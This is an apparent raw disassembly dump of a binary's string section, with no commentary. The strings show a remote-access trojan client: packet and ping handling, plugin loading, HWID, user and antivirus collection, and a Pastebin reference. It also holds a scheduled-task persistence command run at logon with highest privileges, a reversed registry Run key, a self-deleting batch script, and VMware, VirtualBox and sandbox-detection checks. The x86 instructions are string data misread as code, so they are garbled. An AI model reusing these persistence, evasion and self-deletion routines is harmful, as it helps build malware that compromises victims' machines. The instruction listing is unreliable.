  40b6c6:	00 76 00             	add    %dh,0x0(%esi)
  40b6c9:	65 00 58 00          	add    %bl,%gs:0x0(%eax)
  40b6cd:	4d                   	dec    %ebp
  40b6ce:	00 4d 00             	add    %cl,0x0(%ebp)
  40b6d1:	69 00 39 00 49 00    	imul   $0x490039,(%eax),%eax
  40b6d7:	62 00                	bound  %eax,(%eax)
  40b6d9:	52                   	push   %edx
  40b6da:	00 54 00 41          	add    %dl,0x41(%eax,%eax,1)
  40b6de:	00 71 00             	add    %dh,0x0(%ecx)
  40b6e1:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40b6e5:	77 00                	ja     0x40b6e7
  40b6e7:	66 00 48 00          	data16 add %cl,0x0(%eax)
  40b6eb:	4f                   	dec    %edi
  40b6ec:	00 38                	add    %bh,(%eax)
  40b6ee:	00 50 00             	add    %dl,0x0(%eax)
  40b6f1:	4f                   	dec    %edi
  40b6f2:	00 58 00             	add    %bl,0x0(%eax)
  40b6f5:	5a                   	pop    %edx
  40b6f6:	00 49 00             	add    %cl,0x0(%ecx)
  40b6f9:	78 00                	js     0x40b6fb
  40b6fb:	44                   	inc    %esp
  40b6fc:	00 37                	add    %dh,(%edi)
  40b6fe:	00 64 00 44          	add    %ah,0x44(%eax,%eax,1)
  40b702:	00 32                	add    %dh,(%edx)
  40b704:	00 71 00             	add    %dh,0x0(%ecx)
  40b707:	52                   	push   %edx
  40b708:	00 6b 00             	add    %ch,0x0(%ebx)
  40b70b:	6d                   	insl   (%dx),%es:(%edi)
  40b70c:	00 2b                	add    %ch,(%ebx)
  40b70e:	00 4c 00 64          	add    %cl,0x64(%eax,%eax,1)
  40b712:	00 61 00             	add    %ah,0x0(%ecx)
  40b715:	33 00                	xor    (%eax),%eax
  40b717:	74 00                	je     0x40b719
  40b719:	6e                   	outsb  %ds:(%esi),(%dx)
  40b71a:	00 51 00             	add    %dl,0x0(%ecx)
  40b71d:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b722:	09 6e 00             	or     %ebp,0x0(%esi)
  40b725:	75 00                	jne    0x40b727
  40b727:	6c                   	insb   (%dx),%es:(%edi)
  40b728:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b72c:	01 00                	add    %eax,(%eax)
  40b72e:	03 3a                	add    (%edx),%edi
  40b730:	00 00                	add    %al,(%eax)
  40b732:	0d 50 00 61 00       	or     $0x610050,%eax
  40b737:	63 00                	arpl   %eax,(%eax)
  40b739:	6b 00 65             	imul   $0x65,(%eax),%eax
  40b73c:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40b740:	09 50 00             	or     %edx,0x0(%eax)
  40b743:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40b749:	00 0f                	add    %cl,(%edi)
  40b74b:	4d                   	dec    %ebp
  40b74c:	00 65 00             	add    %ah,0x0(%ebp)
  40b74f:	73 00                	jae    0x40b751
  40b751:	73 00                	jae    0x40b753
  40b753:	61                   	popa
  40b754:	00 67 00             	add    %ah,0x0(%edi)
  40b757:	65 00 00             	add    %al,%gs:(%eax)
  40b75a:	07                   	pop    %es
  40b75b:	63 00                	arpl   %eax,(%eax)
  40b75d:	6d                   	insl   (%dx),%es:(%edi)
  40b75e:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40b762:	69 2f 00 63 00 20    	imul   $0x20006300,(%edi),%ebp
  40b768:	00 73 00             	add    %dh,0x0(%ebx)
  40b76b:	63 00                	arpl   %eax,(%eax)
  40b76d:	68 00 74 00 61       	push   $0x61007400
  40b772:	00 73 00             	add    %dh,0x0(%ebx)
  40b775:	6b 00 73             	imul   $0x73,(%eax),%eax
  40b778:	00 20                	add    %ah,(%eax)
  40b77a:	00 2f                	add    %ch,(%edi)
  40b77c:	00 63 00             	add    %ah,0x0(%ebx)
  40b77f:	72 00                	jb     0x40b781
  40b781:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40b785:	74 00                	je     0x40b787
  40b787:	65 00 20             	add    %ah,%gs:(%eax)
  40b78a:	00 2f                	add    %ch,(%edi)
  40b78c:	00 66 00             	add    %ah,0x0(%esi)
  40b78f:	20 00                	and    %al,(%eax)
  40b791:	2f                   	das
  40b792:	00 73 00             	add    %dh,0x0(%ebx)
  40b795:	63 00                	arpl   %eax,(%eax)
  40b797:	20 00                	and    %al,(%eax)
  40b799:	6f                   	outsl  %ds:(%esi),(%dx)
  40b79a:	00 6e 00             	add    %ch,0x0(%esi)
  40b79d:	6c                   	insb   (%dx),%es:(%edi)
  40b79e:	00 6f 00             	add    %ch,0x0(%edi)
  40b7a1:	67 00 6f 00          	add    %ch,0x0(%bx)
  40b7a5:	6e                   	outsb  %ds:(%esi),(%dx)
  40b7a6:	00 20                	add    %ah,(%eax)
  40b7a8:	00 2f                	add    %ch,(%edi)
  40b7aa:	00 72 00             	add    %dh,0x0(%edx)
  40b7ad:	6c                   	insb   (%dx),%es:(%edi)
  40b7ae:	00 20                	add    %ah,(%eax)
  40b7b0:	00 68 00             	add    %ch,0x0(%eax)
  40b7b3:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  40b7b9:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40b7bd:	74 00                	je     0x40b7bf
  40b7bf:	20 00                	and    %al,(%eax)
  40b7c1:	2f                   	das
  40b7c2:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40b7c6:	00 20                	add    %ah,(%eax)
  40b7c8:	00 22                	add    %ah,(%edx)
  40b7ca:	00 00                	add    %al,(%eax)
  40b7cc:	11 22                	adc    %esp,(%edx)
  40b7ce:	00 20                	add    %ah,(%eax)
  40b7d0:	00 2f                	add    %ch,(%edi)
  40b7d2:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40b7d6:	00 20                	add    %ah,(%eax)
  40b7d8:	00 27                	add    %ah,(%edi)
  40b7da:	00 22                	add    %ah,(%edx)
  40b7dc:	00 01                	add    %al,(%ecx)
  40b7de:	13 22                	adc    (%edx),%esp
  40b7e0:	00 27                	add    %ah,(%edi)
  40b7e2:	00 20                	add    %ah,(%eax)
  40b7e4:	00 26                	add    %ah,(%esi)
  40b7e6:	00 20                	add    %ah,(%eax)
  40b7e8:	00 65 00             	add    %ah,0x0(%ebp)
  40b7eb:	78 00                	js     0x40b7ed
  40b7ed:	69 00 74 00 01 5d    	imul   $0x5d010074,(%eax),%eax
  40b7f3:	5c                   	pop    %esp
  40b7f4:	00 6e 00             	add    %ch,0x0(%esi)
  40b7f7:	75 00                	jne    0x40b7f9
  40b7f9:	52                   	push   %edx
  40b7fa:	00 5c 00 6e          	add    %bl,0x6e(%eax,%eax,1)
  40b7fe:	00 6f 00             	add    %ch,0x0(%edi)
  40b801:	69 00 73 00 72 00    	imul   $0x720073,(%eax),%eax
  40b807:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40b80b:	74 00                	je     0x40b80d
  40b80d:	6e                   	outsb  %ds:(%esi),(%dx)
  40b80e:	00 65 00             	add    %ah,0x0(%ebp)
  40b811:	72 00                	jb     0x40b813
  40b813:	72 00                	jb     0x40b815
  40b815:	75 00                	jne    0x40b817
  40b817:	43                   	inc    %ebx
  40b818:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  40b81c:	00 77 00             	add    %dh,0x0(%edi)
  40b81f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b820:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40b824:	00 69 00             	add    %ch,0x0(%ecx)
  40b827:	57                   	push   %edi
  40b828:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  40b82c:	00 66 00             	add    %ah,0x0(%esi)
  40b82f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b830:	00 73 00             	add    %dh,0x0(%ebx)
  40b833:	6f                   	outsl  %ds:(%esi),(%dx)
  40b834:	00 72 00             	add    %dh,0x0(%edx)
  40b837:	63 00                	arpl   %eax,(%eax)
  40b839:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
  40b83f:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b843:	61                   	popa
  40b844:	00 77 00             	add    %dh,0x0(%edi)
  40b847:	74 00                	je     0x40b849
  40b849:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40b84d:	53                   	push   %ebx
  40b84e:	00 00                	add    %al,(%eax)
  40b850:	03 22                	add    (%edx),%esp
  40b852:	00 00                	add    %al,(%eax)
  40b854:	09 2e                	or     %ebp,(%esi)
  40b856:	00 62 00             	add    %ah,0x0(%edx)
  40b859:	61                   	popa
  40b85a:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40b85e:	13 40 00             	adc    0x0(%eax),%eax
  40b861:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b865:	68 00 6f 00 20       	push   $0x20006f00
  40b86a:	00 6f 00             	add    %ch,0x0(%edi)
  40b86d:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40b871:	00 1f                	add    %bl,(%edi)
  40b873:	74 00                	je     0x40b875
  40b875:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40b87b:	6f                   	outsl  %ds:(%esi),(%dx)
  40b87c:	00 75 00             	add    %dh,0x0(%ebp)
  40b87f:	74 00                	je     0x40b881
  40b881:	20 00                	and    %al,(%eax)
  40b883:	33 00                	xor    (%eax),%eax
  40b885:	20 00                	and    %al,(%eax)
  40b887:	3e 00 20             	add    %ah,%ds:(%eax)
  40b88a:	00 4e 00             	add    %cl,0x0(%esi)
  40b88d:	55                   	push   %ebp
  40b88e:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40b892:	15 53 00 54 00       	adc    $0x540053,%eax
  40b897:	41                   	inc    %ecx
  40b898:	00 52 00             	add    %dl,0x0(%edx)
  40b89b:	54                   	push   %esp
  40b89c:	00 20                	add    %ah,(%eax)
  40b89e:	00 22                	add    %ah,(%edx)
  40b8a0:	00 22                	add    %ah,(%edx)
  40b8a2:	00 20                	add    %ah,(%eax)
  40b8a4:	00 22                	add    %ah,(%edx)
  40b8a6:	00 00                	add    %al,(%eax)
  40b8a8:	07                   	pop    %es
  40b8a9:	43                   	inc    %ebx
  40b8aa:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40b8ae:	00 00                	add    %al,(%eax)
  40b8b0:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  40b8b4:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40b8b8:	00 22                	add    %ah,(%edx)
  40b8ba:	00 00                	add    %al,(%eax)
  40b8bc:	0f 22 00             	mov    %eax,%cr0
  40b8bf:	20 00                	and    %al,(%eax)
  40b8c1:	2f                   	das
  40b8c2:	00 66 00             	add    %ah,0x0(%esi)
  40b8c5:	20 00                	and    %al,(%eax)
  40b8c7:	2f                   	das
  40b8c8:	00 71 00             	add    %dh,0x0(%ecx)
  40b8cb:	00 05 78 00 70 00    	add    %al,0x700078
  40b8d1:	00 45 53             	add    %al,0x53(%ebp)
  40b8d4:	00 65 00             	add    %ah,0x0(%ebp)
  40b8d7:	6c                   	insb   (%dx),%es:(%edi)
  40b8d8:	00 65 00             	add    %ah,0x0(%ebp)
  40b8db:	63 00                	arpl   %eax,(%eax)
  40b8dd:	74 00                	je     0x40b8df
  40b8df:	20 00                	and    %al,(%eax)
  40b8e1:	2a 00                	sub    (%eax),%al
  40b8e3:	20 00                	and    %al,(%eax)
  40b8e5:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40b8e9:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8ea:	00 6d 00             	add    %ch,0x0(%ebp)
  40b8ed:	20 00                	and    %al,(%eax)
  40b8ef:	57                   	push   %edi
  40b8f0:	00 69 00             	add    %ch,0x0(%ecx)
  40b8f3:	6e                   	outsb  %ds:(%esi),(%dx)
  40b8f4:	00 33                	add    %dh,(%ebx)
  40b8f6:	00 32                	add    %dh,(%edx)
  40b8f8:	00 5f 00             	add    %bl,0x0(%edi)
  40b8fb:	43                   	inc    %ebx
  40b8fc:	00 6f 00             	add    %ch,0x0(%edi)
  40b8ff:	6d                   	insl   (%dx),%es:(%edi)
  40b900:	00 70 00             	add    %dh,0x0(%eax)
  40b903:	75 00                	jne    0x40b905
  40b905:	74 00                	je     0x40b907
  40b907:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b90b:	53                   	push   %ebx
  40b90c:	00 79 00             	add    %bh,0x0(%ecx)
  40b90f:	73 00                	jae    0x40b911
  40b911:	74 00                	je     0x40b913
  40b913:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40b917:	00 19                	add    %bl,(%ecx)
  40b919:	4d                   	dec    %ebp
  40b91a:	00 61 00             	add    %ah,0x0(%ecx)
  40b91d:	6e                   	outsb  %ds:(%esi),(%dx)
  40b91e:	00 75 00             	add    %dh,0x0(%ebp)
  40b921:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40b925:	63 00                	arpl   %eax,(%eax)
  40b927:	74 00                	je     0x40b929
  40b929:	75 00                	jne    0x40b92b
  40b92b:	72 00                	jb     0x40b92d
  40b92d:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b931:	00 2b                	add    %ch,(%ebx)
  40b933:	6d                   	insl   (%dx),%es:(%edi)
  40b934:	00 69 00             	add    %ch,0x0(%ecx)
  40b937:	63 00                	arpl   %eax,(%eax)
  40b939:	72 00                	jb     0x40b93b
  40b93b:	6f                   	outsl  %ds:(%esi),(%dx)
  40b93c:	00 73 00             	add    %dh,0x0(%ebx)
  40b93f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b940:	00 66 00             	add    %ah,0x0(%esi)
  40b943:	74 00                	je     0x40b945
  40b945:	20 00                	and    %al,(%eax)
  40b947:	63 00                	arpl   %eax,(%eax)
  40b949:	6f                   	outsl  %ds:(%esi),(%dx)
  40b94a:	00 72 00             	add    %dh,0x0(%edx)
  40b94d:	70 00                	jo     0x40b94f
  40b94f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b950:	00 72 00             	add    %dh,0x0(%edx)
  40b953:	61                   	popa
  40b954:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40b958:	00 6f 00             	add    %ch,0x0(%edi)
  40b95b:	6e                   	outsb  %ds:(%esi),(%dx)
  40b95c:	00 00                	add    %al,(%eax)
  40b95e:	0b 4d 00             	or     0x0(%ebp),%ecx
  40b961:	6f                   	outsl  %ds:(%esi),(%dx)
  40b962:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40b966:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b96a:	0f 56 00             	orps   (%eax),%xmm0
  40b96d:	49                   	dec    %ecx
  40b96e:	00 52 00             	add    %dl,0x0(%edx)
  40b971:	54                   	push   %esp
  40b972:	00 55 00             	add    %dl,0x0(%ebp)
  40b975:	41                   	inc    %ecx
  40b976:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40b97a:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  40b97f:	77 00                	ja     0x40b981
  40b981:	61                   	popa
  40b982:	00 72 00             	add    %dh,0x0(%edx)
  40b985:	65 00 00             	add    %al,%gs:(%eax)
  40b988:	15 56 00 69 00       	adc    $0x690056,%eax
  40b98d:	72 00                	jb     0x40b98f
  40b98f:	74 00                	je     0x40b991
  40b991:	75 00                	jne    0x40b993
  40b993:	61                   	popa
  40b994:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40b998:	00 6f 00             	add    %ch,0x0(%edi)
  40b99b:	78 00                	js     0x40b99d
  40b99d:	00 17                	add    %dl,(%edi)
  40b99f:	53                   	push   %ebx
  40b9a0:	00 62 00             	add    %ah,0x0(%edx)
  40b9a3:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  40b9a9:	6c                   	insb   (%dx),%es:(%edi)
  40b9aa:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40b9ae:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40b9b2:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b9b6:	11 45 00             	adc    %eax,0x0(%ebp)
  40b9b9:	72 00                	jb     0x40b9bb
  40b9bb:	72 00                	jb     0x40b9bd
  40b9bd:	20 00                	and    %al,(%eax)
  40b9bf:	48                   	dec    %eax
  40b9c0:	00 57 00             	add    %dl,0x0(%edi)
  40b9c3:	49                   	dec    %ecx
  40b9c4:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40b9c8:	05 78 00 32 00       	add    $0x320078,%eax
  40b9cd:	00 15 43 00 6c 00    	add    %dl,0x6c0043
  40b9d3:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  40b9d9:	74 00                	je     0x40b9db
  40b9db:	49                   	dec    %ecx
  40b9dc:	00 6e 00             	add    %ch,0x0(%esi)
  40b9df:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40b9e3:	00 09                	add    %cl,(%ecx)
  40b9e5:	48                   	dec    %eax
  40b9e6:	00 57 00             	add    %dl,0x0(%edi)
  40b9e9:	49                   	dec    %ecx
  40b9ea:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40b9ee:	09 55 00             	or     %edx,0x0(%ebp)
  40b9f1:	73 00                	jae    0x40b9f3
  40b9f3:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b9f7:	00 05 4f 00 53 00    	add    %al,0x53004f
  40b9fd:	00 13                	add    %dl,(%ebx)
  40b9ff:	4d                   	dec    %ebp
  40ba00:	00 69 00             	add    %ch,0x0(%ecx)
  40ba03:	63 00                	arpl   %eax,(%eax)
  40ba05:	72 00                	jb     0x40ba07
  40ba07:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba08:	00 73 00             	add    %dh,0x0(%ebx)
  40ba0b:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba0c:	00 66 00             	add    %ah,0x0(%esi)
  40ba0f:	74 00                	je     0x40ba11
  40ba11:	00 03                	add    %al,(%ebx)
  40ba13:	20 00                	and    %al,(%eax)
  40ba15:	00 09                	add    %cl,(%ecx)
  40ba17:	54                   	push   %esp
  40ba18:	00 72 00             	add    %dh,0x0(%edx)
  40ba1b:	75 00                	jne    0x40ba1d
  40ba1d:	65 00 00             	add    %al,%gs:(%eax)
  40ba20:	0b 36                	or     (%esi),%esi
  40ba22:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ba25:	62 00                	bound  %eax,(%eax)
  40ba27:	69 00 74 00 00 0b    	imul   $0xb000074,(%eax),%eax
  40ba2d:	46                   	inc    %esi
  40ba2e:	00 61 00             	add    %ah,0x0(%ecx)
  40ba31:	6c                   	insb   (%dx),%es:(%edi)
  40ba32:	00 73 00             	add    %dh,0x0(%ebx)
  40ba35:	65 00 00             	add    %al,%gs:(%eax)
  40ba38:	0b 33                	or     (%ebx),%esi
  40ba3a:	00 32                	add    %dh,(%edx)
  40ba3c:	00 62 00             	add    %ah,0x0(%edx)
  40ba3f:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  40ba45:	50                   	push   %eax
  40ba46:	00 61 00             	add    %ah,0x0(%ecx)
  40ba49:	74 00                	je     0x40ba4b
  40ba4b:	68 00 00 0f 56       	push   $0x560f0000
  40ba50:	00 65 00             	add    %ah,0x0(%ebp)
  40ba53:	72 00                	jb     0x40ba55
  40ba55:	73 00                	jae    0x40ba57
  40ba57:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40ba5d:	00 0b                	add    %cl,(%ebx)
  40ba5f:	41                   	inc    %ecx
  40ba60:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40ba64:	00 69 00             	add    %ch,0x0(%ecx)
  40ba67:	6e                   	outsb  %ds:(%esi),(%dx)
  40ba68:	00 00                	add    %al,(%eax)
  40ba6a:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  40ba6e:	00 75 00             	add    %dh,0x0(%ebp)
  40ba71:	65 00 00             	add    %al,%gs:(%eax)
  40ba74:	0b 66 00             	or     0x0(%esi),%esp
  40ba77:	61                   	popa
  40ba78:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40ba7c:	00 65 00             	add    %ah,0x0(%ebp)
  40ba7f:	00 17                	add    %dl,(%edi)
  40ba81:	50                   	push   %eax
  40ba82:	00 65 00             	add    %ah,0x0(%ebp)
  40ba85:	72 00                	jb     0x40ba87
  40ba87:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40ba8b:	72 00                	jb     0x40ba8d
  40ba8d:	6d                   	insl   (%dx),%es:(%edi)
  40ba8e:	00 61 00             	add    %ah,0x0(%ecx)
  40ba91:	6e                   	outsb  %ds:(%esi),(%dx)
  40ba92:	00 63 00             	add    %ah,0x0(%ebx)
  40ba95:	65 00 00             	add    %al,%gs:(%eax)
  40ba98:	11 50 00             	adc    %edx,0x0(%eax)
  40ba9b:	61                   	popa
  40ba9c:	00 73 00             	add    %dh,0x0(%ebx)
  40ba9f:	74 00                	je     0x40baa1
  40baa1:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40baa5:	69 00 6e 00 00 13    	imul   $0x1300006e,(%eax),%eax
  40baab:	41                   	inc    %ecx
  40baac:	00 6e 00             	add    %ch,0x0(%esi)
  40baaf:	74 00                	je     0x40bab1
  40bab1:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40bab7:	72 00                	jb     0x40bab9
  40bab9:	75 00                	jne    0x40babb
  40babb:	73 00                	jae    0x40babd
  40babd:	00 13                	add    %dl,(%ebx)
  40babf:	49                   	dec    %ecx
  40bac0:	00 6e 00             	add    %ch,0x0(%esi)
  40bac3:	73 00                	jae    0x40bac5
  40bac5:	74 00                	je     0x40bac7
  40bac7:	61                   	popa
  40bac8:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40bacc:	00 65 00             	add    %ah,0x0(%ebp)
  40bacf:	64 00 00             	add    %al,%fs:(%eax)
  40bad2:	09 50 00             	or     %edx,0x0(%eax)
  40bad5:	6f                   	outsl  %ds:(%esi),(%dx)
  40bad6:	00 6e 00             	add    %ch,0x0(%esi)
  40bad9:	67 00 00             	add    %al,(%bx,%si)
  40badc:	0b 47 00             	or     0x0(%edi),%eax
  40badf:	72 00                	jb     0x40bae1
  40bae1:	6f                   	outsl  %ds:(%esi),(%dx)
  40bae2:	00 75 00             	add    %dh,0x0(%ebp)
  40bae5:	70 00                	jo     0x40bae7
  40bae7:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  40baed:	00 2b                	add    %ch,(%ebx)
  40baef:	5c                   	pop    %esp
  40baf0:	00 72 00             	add    %dh,0x0(%edx)
  40baf3:	6f                   	outsl  %ds:(%esi),(%dx)
  40baf4:	00 6f 00             	add    %ch,0x0(%edi)
  40baf7:	74 00                	je     0x40baf9
  40baf9:	5c                   	pop    %esp
  40bafa:	00 53 00             	add    %dl,0x0(%ebx)
  40bafd:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bb01:	75 00                	jne    0x40bb03
  40bb03:	72 00                	jb     0x40bb05
  40bb05:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40bb0b:	43                   	inc    %ebx
  40bb0c:	00 65 00             	add    %ah,0x0(%ebp)
  40bb0f:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb10:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40bb14:	00 72 00             	add    %dh,0x0(%edx)
  40bb17:	32 00                	xor    (%eax),%al
  40bb19:	00 3d 53 00 65 00    	add    %bh,0x650053
  40bb1f:	6c                   	insb   (%dx),%es:(%edi)
  40bb20:	00 65 00             	add    %ah,0x0(%ebp)
  40bb23:	63 00                	arpl   %eax,(%eax)
  40bb25:	74 00                	je     0x40bb27
  40bb27:	20 00                	and    %al,(%eax)
  40bb29:	2a 00                	sub    (%eax),%al
  40bb2b:	20 00                	and    %al,(%eax)
  40bb2d:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40bb31:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb32:	00 6d 00             	add    %ch,0x0(%ebp)
  40bb35:	20 00                	and    %al,(%eax)
  40bb37:	41                   	inc    %ecx
  40bb38:	00 6e 00             	add    %ch,0x0(%esi)
  40bb3b:	74 00                	je     0x40bb3d
  40bb3d:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40bb43:	72 00                	jb     0x40bb45
  40bb45:	75 00                	jne    0x40bb47
  40bb47:	73 00                	jae    0x40bb49
  40bb49:	50                   	push   %eax
  40bb4a:	00 72 00             	add    %dh,0x0(%edx)
  40bb4d:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb4e:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40bb52:	00 63 00             	add    %ah,0x0(%ebx)
  40bb55:	74 00                	je     0x40bb57
  40bb57:	00 17                	add    %dl,(%edi)
  40bb59:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40bb5d:	73 00                	jae    0x40bb5f
  40bb5f:	70 00                	jo     0x40bb61
  40bb61:	6c                   	insb   (%dx),%es:(%edi)
  40bb62:	00 61 00             	add    %ah,0x0(%ecx)
  40bb65:	79 00                	jns    0x40bb67
  40bb67:	4e                   	dec    %esi
  40bb68:	00 61 00             	add    %ah,0x0(%ecx)
  40bb6b:	6d                   	insl   (%dx),%es:(%edi)
  40bb6c:	00 65 00             	add    %ah,0x0(%ebp)
  40bb6f:	00 07                	add    %al,(%edi)
  40bb71:	4e                   	dec    %esi
  40bb72:	00 2f                	add    %ch,(%edi)
  40bb74:	00 41 00             	add    %al,0x0(%ecx)
  40bb77:	00 05 2c 00 20 00    	add    %al,0x20002c
  40bb7d:	00 13                	add    %dl,(%ebx)
  40bb7f:	53                   	push   %ebx
  40bb80:	00 6f 00             	add    %ch,0x0(%edi)
  40bb83:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40bb88:	00 61 00             	add    %ah,0x0(%ecx)
  40bb8b:	72 00                	jb     0x40bb8d
  40bb8d:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  40bb92:	09 70 00             	or     %esi,0x0(%eax)
  40bb95:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb96:	00 6e 00             	add    %ch,0x0(%esi)
  40bb99:	67 00 00             	add    %al,(%bx,%si)
  40bb9c:	0d 70 00 6c 00       	or     $0x6c0070,%eax
  40bba1:	75 00                	jne    0x40bba3
  40bba3:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40bba7:	6e                   	outsb  %ds:(%esi),(%dx)
  40bba8:	00 00                	add    %al,(%eax)
  40bbaa:	15 73 00 61 00       	adc    $0x610073,%eax
  40bbaf:	76 00                	jbe    0x40bbb1
  40bbb1:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40bbb5:	6c                   	insb   (%dx),%es:(%edi)
  40bbb6:	00 75 00             	add    %dh,0x0(%ebp)
  40bbb9:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40bbbd:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbbe:	00 00                	add    %al,(%eax)
  40bbc0:	07                   	pop    %es
  40bbc1:	44                   	inc    %esp
  40bbc2:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40bbc6:	00 00                	add    %al,(%eax)
  40bbc8:	15 73 00 65 00       	adc    $0x650073,%eax
  40bbcd:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbce:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40bbd2:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bbd6:	00 67 00             	add    %ah,0x0(%edi)
  40bbd9:	69 00 6e 00 00 0d    	imul   $0xd00006e,(%eax),%eax
  40bbdf:	48                   	dec    %eax
  40bbe0:	00 61 00             	add    %ah,0x0(%ecx)
  40bbe3:	73 00                	jae    0x40bbe5
  40bbe5:	68 00 65 00 73       	push   $0x73006500
  40bbea:	00 00                	add    %al,(%eax)
  40bbec:	09 48 00             	or     %ecx,0x0(%eax)
  40bbef:	61                   	popa
  40bbf0:	00 73 00             	add    %dh,0x0(%ebx)
  40bbf3:	68 00 00 1b 50       	push   $0x501b0000
  40bbf8:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bbfc:	00 67 00             	add    %ah,0x0(%edi)
  40bbff:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40bc05:	50                   	push   %eax
  40bc06:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bc0a:	00 67 00             	add    %ah,0x0(%edi)
  40bc0d:	69 00 6e 00 00 07    	imul   $0x700006e,(%eax),%eax
  40bc13:	52                   	push   %edx
  40bc14:	00 75 00             	add    %dh,0x0(%ebp)
  40bc17:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc18:	00 00                	add    %al,(%eax)
  40bc1a:	0f 4d 00             	cmovge (%eax),%eax
  40bc1d:	73 00                	jae    0x40bc1f
  40bc1f:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40bc23:	61                   	popa
  40bc24:	00 63 00             	add    %ah,0x0(%ebx)
  40bc27:	6b 00 00             	imul   $0x0,(%eax),%eax
  40bc2a:	11 52 00             	adc    %edx,0x0(%edx)
  40bc2d:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bc31:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40bc35:	76 00                	jbe    0x40bc37
  40bc37:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40bc3c:	0b 45 00             	or     0x0(%ebp),%eax
  40bc3f:	72 00                	jb     0x40bc41
